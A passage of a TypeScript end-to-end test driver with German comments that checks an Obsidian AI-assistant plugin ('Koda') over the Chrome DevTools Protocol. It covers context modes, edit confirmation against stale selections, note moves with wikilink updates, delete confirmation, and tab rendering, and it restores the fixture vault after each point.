      hidePunkt = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      settings19?.close();
      await schliesseEinstellungen(cdp).catch(() => undefined);
    }
    record("19. `hide()` verwirft den Modell-Cache (toter Endpunkt bleibt nicht tot)", hideOk, hidePunkt);

    // --- 20. Arbeitsplatz-Block: aktive Notiz und Markierung aus der Sidebar heraus --------
    // Die offene Frage der Spec (E3): bleibt `editor.getSelection()` erhalten, wenn der Fokus ins
    // Eingabefeld wechselt? Gemessen, nicht angenommen. Drei Bedingungen: der aktive Leaf ist
    // Koda (sonst misst der Punkt nicht die Sidebar-Situation), der Block nennt die Notiz mit
    // Kopfdaten, und die Markierung steht drin. Kulisse und Leaf-Aufloesung: `SCENE_JS` oben.
    // Eigener try/catch/finally seit der Review-Runde vom 2026-09-02 (Punkt 4) — sonst haette
    // eine Ausnahme hier den Rest des Laufs mitgerissen, ohne dass dieser Punkt rot gemeldet
    // haette, UND den Modus mutiert zurueckgelassen.
    const vorherMode = await cdp.evaluate<string>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].contextMode;`);
    try {
      const punkt20 = await cdp.evaluate<{ aktivIstKoda: boolean; text: string; items: { source: string; path: string; chars: number }[] } | -1 | -2>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.setContextMode("workspace");
        ${SCENE_JS}
        document.querySelector(".koda-input")?.focus();
        await new Promise((r) => setTimeout(r, 300));
        const ctx = await p.currentContext();
        return {
          aktivIstKoda: app.workspace.activeLeaf?.view?.getViewType() === ${JSON.stringify(VIEW_TYPE)},
          text: ctx?.text ?? "",
          items: ctx?.items ?? [],
        };
      `);
      const sel20 = typeof punkt20 === "object" ? punkt20.items.find((i) => i.source === "selection") : undefined;
      record(
        "20. Arbeitsplatz-Block nennt aktive Notiz, Kopfdaten und Markierung — aus der Sidebar heraus",
        typeof punkt20 === "object" && punkt20.aktivIstKoda && punkt20.text.includes("Notes/Project plan.md") && punkt20.text.includes("status: active") && punkt20.text.includes("Model control") && sel20?.chars === 13,
        punkt20 === -2
          ? "Fixture-Notiz Notes/Project plan.md fehlt"
          : punkt20 === -1
            ? "Kulisse nicht hergestellt"
            : `aktiv ist Koda: ${String(punkt20.aktivIstKoda)} · Markierung: ${sel20 ? `${sel20.chars} Zeichen` : "fehlt"} · ${punkt20.text.split("\n")[1] ?? ""}`,
      );
    } catch (error) {
      unmeasured("20. Arbeitsplatz-Block nennt aktive Notiz, Kopfdaten und Markierung — aus der Sidebar heraus", `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
    } finally {
      await cdp.evaluate(`
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].setContextMode(${JSON.stringify(vorherMode)});
        return true;
      `).catch(() => undefined);
    }

    // --- 21. Modus Aus sendet nichts; Befehl und Dropdown sind EIN Zustand ---------------
    // Eigener try/catch/finally aus demselben Grund wie Punkt 20 (Review-Runde 2026-09-02,
    // Punkt 4): `vorherMode` von oben, nicht neu gelesen.
    try {
      const punkt21 = await cdp.evaluate<{ ausNull: boolean; dropdownNachBefehl: string; modeNachDropdown: string; anObjekt: boolean }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:context-mode-off`)});
        await new Promise((r) => setTimeout(r, 200));
        const ausNull = (await p.currentContext()) === null;
        const sel = document.querySelector(".koda-mode");
        const dropdownNachBefehl = sel ? sel.value : "(kein Dropdown)";
        if (sel) { sel.value = "workspace"; sel.dispatchEvent(new Event("change")); }
        await new Promise((r) => setTimeout(r, 200));
        return { ausNull, dropdownNachBefehl, modeNachDropdown: p.contextMode, anObjekt: (await p.currentContext()) !== null };
      `);
      record(
        "21. Modus Aus sendet keinen Kontext; Befehl und Dropdown schalten denselben Zustand",
        punkt21.ausNull && punkt21.dropdownNachBefehl === "off" && punkt21.modeNachDropdown === "workspace" && punkt21.anObjekt,
        `aus → null: ${String(punkt21.ausNull)} · Dropdown nach Befehl: ${punkt21.dropdownNachBefehl} · Modus nach Dropdown: ${punkt21.modeNachDropdown}`,
      );
    } catch (error) {
      unmeasured("21. Modus Aus sendet keinen Kontext; Befehl und Dropdown schalten denselben Zustand", `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
    } finally {
      await cdp.evaluate(`
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].setContextMode(${JSON.stringify(vorherMode)});
        return true;
      `).catch(() => undefined);
    }

    // --- 22. get_workspace und edit_active_note werden gesendet und sind abschaltbar --------
    const vorher22 = await cdp.evaluate<string[]>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.toolsDisabled;`);
    try {
      const an = await cdp.evaluate<string[]>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].currentToolNames();`);
      const aus = await cdp.evaluate<string[]>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.toolsDisabled = ["get_workspace", "edit_active_note"];
        await p.saveSettings();
        return p.currentToolNames();
      `);
      record(
        "22. get_workspace und edit_active_note stehen in der gesendeten Liste und sind abschaltbar",
        an.includes("get_workspace") && an.includes("edit_active_note") && !aus.includes("get_workspace") && !aus.includes("edit_active_note"),
        `an: ${an.join(", ")} · aus: ${aus.join(", ")}`,
      );
    } catch (error) {
      unmeasured("22. get_workspace und edit_active_note stehen in der gesendeten Liste und sind abschaltbar", `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.toolsDisabled = ${JSON.stringify(vorher22 ?? [])};
        return p.saveSettings();
      `).catch(() => undefined);
    }

    // --- 23. edit_active_note: veraltete Markierung schreibt nicht; gueltige schreibt -------
    // Der Aufruf laeuft im Renderer als Promise (das Modal blockiert ihn), das Ergebnis landet in
    // window.__koda23. Erst die Gegenprobe (ohne Aenderung) belegt, dass der Punkt seinen
    // Gegenstand beruehrt — sonst waere „nichts geschrieben" auch bei kaputtem Werkzeug gruen.
    // Rueckschreibung im `finally` laeuft ueber den EDITOR, nicht `vault.modify()`: Letzteres
    // divergiert von einem offenen, ungespeicherten Editor-Puffer, und Obsidian fuehrt beide
    // Staende spaeter zu Artefakten zusammen — gemessen 2026-09-02 als `Model steeringl makes`
    // mit einer verschobenen Leerzeile. `original23` faellt deshalb weg: `FIXTURE_NOTE` oben
    // ist der bekannt gute Zustand, nichts, das dieser Lauf erst lesen muesste.
    let detail23 = "nicht gelaufen";
    let ok23 = false;
    try {
      const starte = async (ersatz: string): Promise<number> => {
        const idx = await cdp.evaluate<number>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          ${SCENE_JS}
          window.__koda23 = null;
          p.buildTools().run("edit_active_note", { path, mode: "replace_selection", text: ${JSON.stringify(ersatz)} }).then((r) => { window.__koda23 = r; });
          return idx;
        `);
        if (idx < 0) throw new Error(idx === -2 ? "Fixture-Notiz Notes/Project plan.md fehlt" : "Kulisse nicht hergestellt");
        const modal = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-preview");`, 8000);
        if (!modal) throw new Error("Bestaetigungs-Modal erschien nicht");
        return idx;
      };
      const bestaetige = async (): Promise<unknown> => {
        await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
        return pollUntil<unknown>(cdp, `return window.__koda23;`, 8000);
      };
      // A: Markierung nach dem Aufruf verkleinern, dann bestaetigen → Fehler, Datei unveraendert.
      const idxA = await starte("Model steering");
      await cdp.evaluate(`app.workspace.getMostRecentLeaf(app.workspace.rootSplit).view.editor.setSelection({ line: ${idxA}, ch: 0 }, { line: ${idxA}, ch: 5 }); return true;`);
      const a = (await bestaetige()) as { ok: boolean; error?: string } | null;
      const inhaltA = await cdp.evaluate<string>(`return app.workspace.getMostRecentLeaf(app.workspace.rootSplit).view.editor.getValue();`);
      // B: Gegenprobe ohne Aenderung → geschrieben.
      await starte("Model steering");
      const b = (await bestaetige()) as { ok: boolean; content?: string } | null;
      const inhaltB = await cdp.evaluate<string>(`return app.workspace.getMostRecentLeaf(app.workspace.rootSplit).view.editor.getValue();`);
      ok23 = a?.ok === false && /geändert|changed/.test(a?.error ?? "") && inhaltA.includes("Model control makes") && b?.ok === true && inhaltB.includes("Model steering makes");
      // Die Zeile nennt, WAS gemessen wurde (Model-Zeile in A und B), nicht nur das ok/verweigert-
      // Fazit — ein rotes Ergebnis ohne diese Zeile kostete die dritte Runde eine volle
      // Nachstellung, weil "GESCHRIEBEN, ok true" wie ein bestandener Punkt aussah.
      const zeile = (t: string): string => t.split("\n").find((l) => l.startsWith("Model ")) ?? "(keine Model-Zeile)";
      detail23 = `veraltet: ${a?.ok === false ? "verweigert" : "GESCHRIEBEN"} (${a?.error ?? ""}) · gueltig: ${b?.ok === true ? "geschrieben" : "verweigert"} · A: „${zeile(inhaltA).slice(0, 40)}“ · B: „${zeile(inhaltB).slice(0, 40)}“${b?.content ? ` · ${b.content}` : ""}`;
    } catch (error) {
      detail23 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      // Rueckschreibung ueber den EDITOR (nicht `vault.modify()`, s. Kommentar oben): der
      // root-split Leaf, der die Notiz noch offen haelt, bekommt den Fixture-Text direkt in
      // den Puffer. Nur wenn keiner die Notiz mehr offen haelt, greift der Vault-Fallback.
      await cdp.evaluate(`
        const path = ${JSON.stringify("Notes/Project plan.md")};
        const leaf = app.workspace.getMostRecentLeaf(app.workspace.rootSplit);
        if (leaf && leaf.view?.file?.path === path) {
          leaf.view.editor.setValue(${JSON.stringify(FIXTURE_NOTE)});
        } else {
          const f = app.vault.getFileByPath(path);
          if (f) await app.vault.modify(f, ${JSON.stringify(FIXTURE_NOTE)});
        }
        return true;
      `).catch(() => undefined);
      await cdp.evaluate(`
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].setContextMode(${JSON.stringify(vorherMode)});
        return true;
      `).catch(() => undefined);
      await schliesseDialog(cdp).catch(() => undefined);
    }
    record("23. edit_active_note: veraltete Markierung schreibt nicht, gueltige schreibt (Invariante Vorschau == Inhalt)", ok23, detail23);

    // --- 24. move_note zieht die Wikilinks nach ------------------------------------------
    // DIE Frage, die dieser Punkt existiert um zu beantworten: `fileManager.renameFile` zieht
    // laut Doku die Links verweisender Notizen nach — ob das auch gilt, wenn Obsidians
    // Einstellung „Automatically update internal links" AUS steht, ist aus der Doku nicht zu
    // beantworten. Deshalb wird die Einstellung GEMESSEN und mitprotokolliert, statt sie zu
    // setzen: ein Punkt, der sich seine Vorbedingung selbst herstellt, misst nicht mehr, was
    // der Nutzer erlebt.
    //
    // ⚠️ Gemessen am 2026-09-04, und die erste Fassung dieses Punktes war daran falsch:
    // Obsidian schreibt einen Link nur um, wenn er sonst NICHT MEHR AUFLOEST — und waehlt
    // dabei die kuerzeste eindeutige Form. Ein kurzer `[[Tools]]` bleibt beim Verschieben
    // deshalb voellig unveraendert (er zeigt weiter aufs richtige File, der Dateiname hat
    // sich ja nicht geaendert), waehrend `[[Notes/Tools]]` zu `[[Tools]]` wird — NICHT zu
    // `[[Archiv/Tools]]`. Wer „steht der neue Pfad im Text?" prueft, misst also bei kurzen
    // Links einen Fehlschlag, wo alles richtig ist. Der Punkt prueft deshalb BEIDE Haelften
    // an einer eigens angelegten Probe-Notiz: die Verlinkung bleibt intakt (der kurze Link
    // loest auf den NEUEN Pfad auf) und Obsidian fasst den Text an, wo er es muss.
    let detail24 = "nicht gelaufen";
    let ok24 = false;
    const QUELLE24 = "Notes/Tools.md";
    const ZIEL24 = "Archiv/Tools.md";
    const PROBE24 = "Probe-smoke24.md";
    try {
      const linkOption = await cdp.evaluate<unknown>(
        `return app.vault.getConfig ? app.vault.getConfig("alwaysUpdateLinks") : "unbekannt";`,
      );
      await cdp.evaluate(`
        const alt = app.vault.getFileByPath(${JSON.stringify(PROBE24)});
        if (alt) await app.fileManager.trashFile(alt);
        await app.vault.create(${JSON.stringify(PROBE24)}, "kurz: [[Tools]]\\nmit Pfad: [[Notes/Tools]]\\n");
        return true;
      `);
      // Der Cache muss die frische Notiz kennen, sonst zieht der Rename ihre Links nicht nach.
      const bekannt = await pollUntil<boolean>(cdp, `
        const d = app.metadataCache.getFirstLinkpathDest("Tools", ${JSON.stringify(PROBE24)});
        return d ? d.path === ${JSON.stringify(QUELLE24)} : false;
      `, 8000);
      if (!bekannt) throw new Error("Probe-Notiz kam nicht in den metadataCache");

      await cdp.evaluate(`
        window.__koda24 = null;
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools()
          .run("move_note", { source_path: ${JSON.stringify(QUELLE24)}, destination_path: ${JSON.stringify(ZIEL24)} })
          .then((r) => { window.__koda24 = r; });
        return true;
      `);
      const modal24 = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-move-paths");`, 8000);
      if (!modal24) throw new Error("Move-Modal erschien nicht");
      await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
      const r24 = (await pollUntil<{ ok: boolean; content?: string; error?: string }>(cdp, `return window.__koda24;`, 8000)) ?? null;

      // (a) Verlinkung intakt: der kurze Link zeigt jetzt auf den NEUEN Pfad.
      const loestAuf = await pollUntil<string>(cdp, `
        const d = app.metadataCache.getFirstLinkpathDest("Tools", ${JSON.stringify(PROBE24)});
        return d ? d.path : null;
      `, 8000);
      // (b) Text angefasst, wo noetig: der Pfad-Link nennt "Notes/Tools" nicht mehr.
      const text = await cdp.evaluate<string>(`
        const f = app.vault.getFileByPath(${JSON.stringify(PROBE24)});
        return f ? await app.vault.read(f) : "(fehlt)";
      `);
      const pfadWeg = !text.includes("[[Notes/Tools]]");
      ok24 = r24?.ok === true && loestAuf === ZIEL24 && pfadWeg;
      detail24 = `Werkzeug: ${r24?.ok === true ? "verschoben" : `FEHLER (${r24?.error ?? "?"})`} · kurzer Link loest auf: ${loestAuf ?? "GAR NICHT"} · Pfad-Link im Text: ${pfadWeg ? "angepasst" : "UNVERAENDERT"} („${text.split("\n").filter((l) => l.includes("[[")).join(" | ")}") · alwaysUpdateLinks: ${String(linkOption)}`;
    } catch (error) {
      detail24 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const f = app.vault.getFileByPath(${JSON.stringify(ZIEL24)});
        if (f) await app.fileManager.renameFile(f, ${JSON.stringify(QUELLE24)});
        const probe = app.vault.getFileByPath(${JSON.stringify(PROBE24)});
        if (probe) await app.fileManager.trashFile(probe);
        return true;
      `).catch(() => undefined);
      await schliesseDialog(cdp).catch(() => undefined);
    }
    record("24. move_note verschiebt, die Verlinkung bleibt intakt und Obsidian passt den Text an, wo noetig", ok24, detail24);

    // --- 25. Das Move-Modal nennt die Reichweite -----------------------------------------
    // Der Punkt misst den TEXT im Modal, nicht dass ein Modal kommt: die Backlink-Zahl ist
    // die Information, auf der die Freigabe beruht, und sie wandert durch drei Schichten
    // (metadataCache → Port → Modal). Eine davon still auf 0 zu setzen faellt sonst nicht auf.
    let detail25 = "nicht gelaufen";
    let ok25 = false;
    try {
      await cdp.evaluate(`
        window.__koda25 = null;
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools()
          .run("move_note", { source_path: ${JSON.stringify(QUELLE24)}, destination_path: "Archiv/Tools-x.md" })
          .then((r) => { window.__koda25 = r; });
        return true;
      `);
      const da = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-move-paths");`, 8000);
      if (!da) throw new Error("Move-Modal erschien nicht");
      const gelesen = await cdp.evaluate<{ pfade: string; hinweis: string; knopf: string }>(`
        const m = document.querySelector(".modal-container");
        return {
          pfade: m.querySelector(".koda-move-paths")?.innerText ?? "",
          hinweis: m.querySelector(".koda-move-note")?.innerText ?? "",
          knopf: m.querySelector(".modal-button-container button:last-child")?.innerText ?? "",
        };
      `);
      // Abbrechen: dieser Punkt misst die Anzeige, er soll nichts verschieben.
      await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:first-child") ?? null`);
      const nenntBeide = gelesen.pfade.includes(QUELLE24) && gelesen.pfade.includes("Archiv/Tools-x.md");
      const nenntZahl = /\b2\b/.test(gelesen.hinweis);
      const nochDa = await cdp.evaluate<boolean>(`return app.vault.getFileByPath(${JSON.stringify(QUELLE24)}) !== null;`);
      ok25 = nenntBeide && nenntZahl && nochDa;
      detail25 = `Pfade: ${nenntBeide ? "beide genannt" : `UNVOLLSTAENDIG („${gelesen.pfade.replace(/\n/g, " / ")}")`} · Reichweite: „${gelesen.hinweis}" ${nenntZahl ? "(2 erwartet, genannt)" : "(2 ERWARTET, FEHLT)"} · Knopf: „${gelesen.knopf}" · nach Abbruch am alten Ort: ${nochDa ? "ja" : "NEIN"}`;
    } catch (error) {
      detail25 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await schliesseDialog(cdp).catch(() => undefined);
    }
    record("25. Das Move-Modal nennt beide Pfade und die Zahl der verweisenden Notizen", ok25, detail25);

    // --- 26. delete_note fragt AUCH im Koda-Ordner ---------------------------------------
    // Die Regel „Wirkung schlaegt Ort" ist im Adapter getestet; hier wird sie am laufenden
    // Plugin gemessen, weil sie die einzige ist, die eine Datei verschwinden laesst. Der
    // Pruefling ist eine eigens angelegte Wegwerf-Notiz IM Koda-Ordner — dort waere ein
    // write_note frei, ein delete_note darf es nicht sein.
    let detail26 = "nicht gelaufen";
    let ok26 = false;
    const OPFER = "Koda/wegwerf-smoke26.md";
    try {
      await cdp.evaluate(`
        const alt = app.vault.getFileByPath(${JSON.stringify(OPFER)});
        if (alt) await app.fileManager.trashFile(alt);
        await app.vault.create(${JSON.stringify(OPFER)}, "wegwerf");
        window.__koda26 = null;
        app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].buildTools()
          .run("delete_note", { path: ${JSON.stringify(OPFER)} })
          .then((r) => { window.__koda26 = r; });
        return true;
      `);
      const gefragt = await pollUntil<boolean>(cdp, `return !!document.querySelector(".modal-container .koda-delete-warn, .modal-container .koda-move-note");`, 8000);
      if (!gefragt) throw new Error("Loesch-Modal erschien nicht — im Koda-Ordner NICHT gefragt");
      const knopf = await cdp.evaluate<string>(`return document.querySelector(".modal-container .modal-button-container button:last-child")?.innerText ?? "";`);
      await clickReal(cdp, `document.querySelector(".modal-container .modal-button-container button:last-child") ?? null`);
      const r26 = (await pollUntil<{ ok: boolean }>(cdp, `return window.__koda26;`, 8000)) ?? null;
      const weg = await cdp.evaluate<boolean>(`return app.vault.getFileByPath(${JSON.stringify(OPFER)}) === null;`);
      ok26 = gefragt && r26?.ok === true && weg;
      detail26 = `im Koda-Ordner gefragt: ja · Knopf: „${knopf}" · Werkzeug: ${r26?.ok === true ? "ok" : "FEHLER"} · Datei danach: ${weg ? "weg" : "NOCH DA"}`;
    } catch (error) {
      detail26 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    } finally {
      await cdp.evaluate(`
        const rest = app.vault.getFileByPath(${JSON.stringify(OPFER)});
        if (rest) await app.fileManager.trashFile(rest);
        return true;
      `).catch(() => undefined);
      await schliesseDialog(cdp).catch(() => undefined);
    }
    record("26. delete_note fragt auch im Koda-Ordner nach und legt die Notiz in den Papierkorb", ok26, detail26);

    // ---- 27 + 28: restaurierte Tabs und doppelte Pfade ------------------------
    //
    // Beide messen dieselbe Naht zum Host und teilen deshalb einen Aufbau: drei Tabs, davon
    // ZWEI auf derselben Notiz. Danach `changeLayout(getLayout())` — das stellt die
    // nicht-aktiven Tabs so wieder her, wie ein Neustart es taete, naemlich als
    // DeferredViews (gemessen 2026-09-05: 3 von 4 Leaves). Das ist der Grund, warum es
    // diesen Punkt jetzt gibt: Handpunkt 25 verlangte bisher Fenster-Schliessen und
    // Neuoeffnen und war deshalb nur von Hand belegt — eine Regel, die nur die
    // Unit-Tests decken, ist auf der Obsidian-Seite unbelegt.
    //
    // Der Punkt belegt seinen eigenen Gegenstand mit: ohne mindestens einen DeferredView
    // waere er gruen, ohne die Sache je beruehrt zu haben (dieselbe Vorsicht wie bei
    // Punkt 19s mittlerer Messung). Deshalb wartet er auf den Zustand, statt ihn
    // anzunehmen, und faellt durch, wenn er ausbleibt.
    const TAB_A = "Notes/Project plan.md";
    const TAB_B = "Notes/Compaction.md";
    let ok27 = false;
    let detail27 = "";
    let ok28 = false;
    let detail28 = "";
    try {
      await cdp.evaluate(`
        window.__kodaLayoutVorher = app.workspace.getLayout();
        for (const pfad of [${JSON.stringify(TAB_A)}, ${JSON.stringify(TAB_A)}, ${JSON.stringify(TAB_B)}]) {
          const datei = app.vault.getFileByPath(pfad);
          if (!datei) continue;
          await app.workspace.getLeaf("tab").openFile(datei);
          await new Promise((r) => setTimeout(r, 200));
        }
        await app.workspace.changeLayout(app.workspace.getLayout());
        return true;
      `);
      // Die Messung liest den Block, OHNE einen Tab anzufassen — ein Klick wuerde den
      // DeferredView laden und damit genau den Zustand zerstoeren, um den es geht.
      const mess = await pollUntil<{
        items: string[];
        allePfade: string[];
        deferredPfade: string[];
      }>(
        cdp,
        `
        const plugin = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const ctx = plugin ? await plugin.currentContext() : null;
        if (!ctx) return null;
        const items = (ctx.items ?? []).filter((i) => i.source === "tab").map((i) => i.path);
        const allePfade = []; const deferredPfade = [];
        app.workspace.iterateAllLeaves((l) => {
          const root = l.getRoot();
          if (root === app.workspace.leftSplit || root === app.workspace.rightSplit) return;
          const st = l.getViewState();
          if (st && st.type === ${JSON.stringify(VIEW_TYPE)}) return;
          const ausView = l.view && l.view.file ? l.view.file.path : null;
          const ausState = st && st.state && typeof st.state.file === "string" && st.state.file !== "" ? st.state.file : null;
          const pfad = ausView ?? ausState;
          if (!pfad) return;
          allePfade.push(pfad);
          if (l.isDeferred) deferredPfade.push(pfad);
        });
        // Kein DeferredView heisst NICHT „bestanden", sondern „noch nicht so weit" —
        // deshalb null statt eines Ergebnisses (pollUntil-Vertrag).
        if (deferredPfade.length === 0) return null;
        return { items, allePfade, deferredPfade };
      `,
        15_000,
      );
      if (mess === null) throw new Error("kein DeferredView entstanden — der Punkt haette seinen Gegenstand nicht beruehrt");
      const fehlend = mess.deferredPfade.filter((pfad) => !mess.items.includes(pfad));
      ok27 = mess.deferredPfade.length > 0 && fehlend.length === 0;
      detail27 = `DeferredViews: ${mess.deferredPfade.length} · davon im Block: ${mess.deferredPfade.length - fehlend.length}${fehlend.length > 0 ? ` · FEHLT: ${fehlend.join(", ")}` : ""}`;

      const leavesMitA = mess.allePfade.filter((pfad) => pfad === TAB_A).length;
      const imBlockA = mess.items.filter((pfad) => pfad === TAB_A).length;
      const eindeutig = new Set(mess.allePfade).size;
      ok28 = leavesMitA >= 2 && imBlockA === 1 && mess.items.length === eindeutig;
      detail28 = `Leaves auf „${TAB_A}": ${leavesMitA} · im Block: ${imBlockA} · Block-Eintraege ${mess.items.length} vs. eindeutige Pfade ${eindeutig}`;
    } catch (error) {
      const grund = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      detail27 = grund;
      detail28 = grund;
    } finally {
      // Das Layout so zuruecksetzen, wie es vorgefunden wurde — der Vault ist Wegwerfware,
      // aber ein Lauf, der Tabs stehen laesst, veraendert die Ausgangslage des naechsten.
      await cdp
        .evaluate(`
          if (window.__kodaLayoutVorher) await app.workspace.changeLayout(window.__kodaLayoutVorher);
          delete window.__kodaLayoutVorher;
          return true;
        `)
        .catch(() => undefined);
    }
    record("27. Restaurierte, nicht besuchte Tabs (DeferredViews) stehen im Arbeitskontext", ok27, detail27);
    record("28. Dieselbe Notiz in zwei Tabs steht einmal im Block, nicht zweimal", ok28, detail28);

    let ok29 = false;
    let detail29 = "";
    try {
      // Fix-Runde 1, Finding 1 + Fix-Runde 2: Punkt 27 kurz zuvor ruft
      // changeLayout(getLayout()), um DeferredViews zu erzeugen — das laesst die Koda-View
      // im echten Lauf haeufig in einem DOM-Zwischenstand zurueck (Tab-Leiste fehlt),
      // obwohl das Produkt in Ordnung ist. Der blosse Oeffnen-Befehl reicht dabei NICHT:
      // `activateView()` findet die bestehende (kaputte) Leaf ueber
      // `getLeavesOfType` und ruft nur `setViewState`/`revealLeaf` auf ihr — das baut die
      // View nicht neu auf (verifiziert am laufenden Obsidian, Fix-Runde 2: 1 Tab bleibt 1
      // Tab, bis die Leaf explizit detacht wird). Der Punkt detacht deshalb zuerst jede
      // Leaf dieses View-Typs, bevor er den Oeffnen-Befehl feuert — erst das erzwingt einen
      // frischen `onOpen()`-Aufbau. Mutation (Detach + Oeffnen-Befehl) und Wartephase
      // (pollUntil) bleiben getrennt, wie bei Punkt 2. Die Reihenfolge zu Punkt 27 bleibt
      // unveraendert.
      await cdp.evaluate(`
        for (const l of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) l.detach();
        await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:open`)});
        return true;
      `);
      const mass = await pollUntil<{ tabs: number; hoehe: number; labels: string[] }>(
        cdp,
        `
          const btns = Array.from(document.querySelectorAll(".koda-root .okit-hub-tabs [role='tab'], .koda-root .okit-hub-tabs button"));
          // Weniger als zwei Tabs heisst „noch nicht fertig gerendert" — null statt eines
          // wahrheitsfaehigen Leerstands, sonst wuerde pollUntil den Zwischenstand als
          // Ergebnis nehmen.
          if (btns.length < 2) return null;
          return {
            tabs: btns.length,
            hoehe: Math.min(...btns.map((b) => b.getBoundingClientRect().height)),
            labels: btns.map((b) => b.innerText.trim()),
          };
        `,
        15_000,
      );
      if (mass === null) throw new Error("Hub-Tabs nach dem Oeffnen-Befehl nicht vollstaendig gerendert");
      // Größe, nicht Existenz: in einer Seitenleiste kann ein Element im DOM stehen und null
      // Pixel hoch sein — genau der Defekt von 0.10.1.
      // Seit Plan 1 (Welle 24) drei Tabs: Chat, Kontext, Faehigkeiten. Die Zahl ist der Beleg, dass der dritte Tab da ist.
      ok29 = mass.tabs === 3 && mass.hoehe > 0 && mass.labels.length === 3;
      detail29 = `Tabs: ${mass.tabs} · kleinste Hoehe: ${mass.hoehe}px · Labels: ${mass.labels.join(" | ")}`;
    } catch (error) {
      detail29 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    // Gegenprobe: in `src/obsidian/view.ts` in `buildHubInto(..., [chatPanel, this.ctxPanel], ...)`
    // das `this.ctxPanel` aus dem Panel-Array streichen, neu bauen/deployen. Erwartung: die
    // Hub-Leiste hat nur noch einen Tab, `pollUntil` findet nie zwei Buttons und laeuft in
    // den 15s-Timeout, der Punkt wird rot mit „Hub-Tabs nach dem Oeffnen-Befehl nicht
    // vollstaendig gerendert".
    record("29. Hub-Tabs Chat, Kontext und Faehigkeiten sind sichtbar (Hoehe > 0, nicht nur im DOM)", ok29, detail29);

    // Nachgezogen (Etappe 2b, Task 11): `currentContext()` ist seit Task 6 async
    // (Volltext-Modi lesen Notizen). Ohne `await` liefert jeder Aufruf ein Promise-Objekt
    // statt eines ContextAttachment — `?.text` griffe daneben, `vorher`/`nachher`/`zurueck`
    // waeren alle `""`, und `r.vorher !== r.nachher` scheiterte: der Punkt wuerde selbst
    // GRUEN sein Ziel verfehlen (er misst dann nichts), oder — mit einem echten Tab in der
    // Kulisse — ROT mit „KEIN TAB" melden, obwohl ein Tab da ist. `typecheck:scripts` sieht
    // das nicht, weil der Aufruf in einer CDP-Zeichenkette liegt, kein TS-Ausdruck ist.
    // Haertung (Baseline-Lauf 2026-09-05/06, Nachtrag): „KEIN TAB" durfte den Punkt vorher
    // BESTEHEN lassen — `vorher="" !== nachher="KEIN TAB"` und `vorher="" === zurueck=""`
    // erfuellten die Bedingung, ohne dass ueberhaupt ein Kontext gelesen wurde. Derselbe
    // Vertrag wie bei `pollUntil` an anderer Stelle im Treiber: „kein Tab gefunden" ist ein
    // Abbruch, kein bestandener Zustand. Der `KEIN TAB`-Zweig wirft deshalb jetzt, statt
    // einen Wert zurueckzugeben, der die Bedingung zufaellig erfuellt.
    let ok30 = false;
    let detail30 = "";
    try {
      const r = await cdp.evaluate<{ vorher: string; nachher: string; zurueck: string; pfad: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const vorher = (await p.currentContext())?.text ?? "";
        const tab = ((await p.currentContext())?.items ?? []).find((i) => i.source === "tab");
        if (!tab) throw new Error("kein Tab im Arbeitsplatz-Kontext gefunden — Gegenstand nicht beruehrt");
        p.toggleContextItem("tab", tab.path);
        const nachher = (await p.currentContext())?.text ?? "";
        p.resetContextSelection();
        const zurueck = (await p.currentContext())?.text ?? "";
        return { vorher, nachher, zurueck, pfad: tab.path };
      `);
      ok30 = r.vorher !== r.nachher && r.vorher === r.zurueck;
      detail30 = `Tab: ${r.pfad} · Block vorher ${r.vorher.length} Z. → abgewaehlt ${r.nachher.length} Z. → zurueckgesetzt ${r.zurueck.length} Z.`;
    } catch (error) {
      detail30 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
    }
    record("30. Ein abgewaehlter Chip verschwindet aus dem gesendeten Block, Zuruecksetzen holt ihn wieder", ok30, detail30);

    let ok31 = false;
    let detail31 = "";
    try {
      // Fix-Runde 1, Finding 3: `sectionStorage().setCollapsed` speichert selbst,
      // fire-and-forget (`void this.saveSettings()`, src/main.ts) — das ist der echte Weg,
      // ueber den ein Klick in der Hub-UI persistiert. Der Punkt ruft deshalb bewusst KEIN
      // eigenes saveSettings() mehr: ein expliziter Aufruf haette den zu pruefenden Effekt
      // selbst herbeigefuehrt, und die im Brief vorgesehene Gegenprobe (den internen Save-
      // Aufruf entfernen) waere daran blind vorbeigelaufen — der Punkt waere gruen
